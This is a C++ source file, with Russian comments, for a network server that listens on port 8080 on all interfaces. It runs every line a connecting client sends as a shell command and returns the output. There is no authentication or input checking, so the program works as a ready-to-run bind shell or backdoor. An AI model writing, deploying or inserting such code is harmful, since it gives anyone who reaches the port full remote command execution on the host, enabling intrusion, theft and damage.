#include <iostream>
#include <cstring>
#include <unistd.h>
#include <arpa/inet.h>
#include <cstdlib>
#include <sstream>

#define PORT 8080
#define BUFFER_SIZE 1024

void executeCommand(const std::string& command, std::string& result) {
    char buffer[BUFFER_SIZE];
    FILE* pipe = popen(command.c_str(), "r");
    if (!pipe) {
        result = "Error: Failed to execute command.";
        return;
    }
    while (fgets(buffer, sizeof(buffer), pipe) != nullptr) {
        result += buffer;
    }
    pclose(pipe);
}

int main() {
    int server_fd, new_socket;
    struct sockaddr_in address;
    int addrlen = sizeof(address);
    char buffer[BUFFER_SIZE] = {0};

    // Создание сокета
    if ((server_fd = socket(AF_INET, SOCK_STREAM, 0)) == 0) {
        perror("Socket failed");
        exit(EXIT_FAILURE);
    }

    // Настройка адреса
    address.sin_family = AF_INET;
    address.sin_addr.s_addr = INADDR_ANY;
    address.sin_port = htons(PORT);

    // Привязка сокета
    if (bind(server_fd, (struct sockaddr*)&address, sizeof(address)) < 0) {
        perror("Bind failed");
        exit(EXIT_FAILURE);
    }

    // Прослушивание порта
    if (listen(server_fd, 3) < 0) {
        perror("Listen failed");
        exit(EXIT_FAILURE);
    }

    std::cout << "Server is running on port " << PORT << std::endl;

    while (true) {
        // Принятие нового соединения
        if ((new_socket = accept(server_fd, (struct sockaddr*)&address, 
                                 (socklen_t*)&addrlen)) < 0) {
            perror("Accept failed");
            exit(EXIT_FAILURE);
        }

        std::cout << "Client connected." << std::endl;

        // Чтение команды от клиента
        while (true) {
            memset(buffer, 0, BUFFER_SIZE);
            int valread = read(new_socket, buffer, BUFFER_SIZE);
            if (valread <= 0) {
                std::cout << "Client disconnected." << std::endl;
                break;
            }

            std::string command(buffer);
            if (command == "exit\n") {
                std::cout << "Shutdown command received. Exiting." << std::endl;
                close(new_socket);
                close(server_fd);
                return 0;
            }

            std::cout << "Received command: " << command;

            // Исполнение команды
            std::string result;
            executeCommand(command, result);

            // Отправка результата клиенту
            send(new_socket, result.c_str(), result.size(), 0);
        }

        close(new_socket);
    }

    return 0;
}